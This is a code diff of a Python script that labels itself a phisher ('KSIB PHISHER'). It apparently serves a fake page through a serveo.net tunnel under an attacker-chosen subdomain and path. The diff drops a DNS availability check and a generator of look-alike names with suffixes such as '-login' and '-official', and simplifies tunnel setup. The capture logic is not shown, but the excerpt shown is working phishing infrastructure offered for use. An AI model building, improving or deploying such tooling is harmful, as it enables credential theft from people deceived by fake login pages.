@@ -1,5 +1,5 @@
 #!/usr/bin/env python3
-# KSIB PHISHER - iSH ICIN SON HAL
+# KSIB PHISHER - iSH ICIN SON HAL (DNS KONTROLU KALDIRILDI)
 import os, sys, http.server, socketserver, time, json, random, uuid, threading, subprocess, socket
 from http.cookies import SimpleCookie
 from urllib.parse import parse_qs, urlparse
@@ -261,13 +261,6 @@ class Handler(http.server.SimpleHTTPRequestHandler):
         except: pass
     def log_message(self, *args): pass
 
-def check_subdomain(subdomain):
-    try:
-        socket.gethostbyname(f"{subdomain}.serveo.net")
-        return True
-    except:
-        return False
-
 def serveo_tunnel(port, subdomain):
     try:
         subprocess.Popen(
@@ -275,12 +268,8 @@ def serveo_tunnel(port, subdomain):
             stdout=subprocess.DEVNULL,
             stderr=subprocess.DEVNULL
         )
-        # 5 saniye bekle, bağlantı kurulsun
         time.sleep(5)
-        # DNS'de görünüyorsa başarılı
-        if check_subdomain(subdomain):
-            return f"https://{subdomain}.serveo.net"
-        return None
+        return f"https://{subdomain}.serveo.net"
     except:
         return None
 
@@ -301,26 +290,12 @@ def main():
     except: pass
 
     print(f"\n🌐 SUBDOMAIN (.serveo.net):")
-    while True:
+    subdomain = input("   Subdomain: ").strip().lower()
+    while not subdomain:
+        print("   ❌ Bos olamaz!")
         subdomain = input("   Subdomain: ").strip().lower()
-        if not subdomain: print("   ❌ Bos olamaz!"); continue
-        if check_subdomain(subdomain):
-            print(f"   ❌ {subdomain}.serveo.net dolu!")
-            alt = None
-            for sfx in ["1","2","-login","-help","-official"]:
-                if not check_subdomain(f"{subdomain}{sfx}"):
-                    alt = f"{subdomain}{sfx}"
-                    break
-            if alt:
-                if input(f"   Alternatif {alt}.serveo.net kullanilsin? (E/H): ").upper() == "E":
-                    subdomain = alt; break
-            else:
-                print("   Alternatif bulunamadi.")
-        else:
-            print(f"   ✅ {subdomain}.serveo.net BOS!")
-            break
-
     Handler.subdomain = subdomain
+    print(f"   ✅ {subdomain}.serveo.net secildi.")
 
     custom = input(f"\n🔗 Ozel yol (bos = standart): ").strip()
     Handler.custom_path = custom if custom else ""
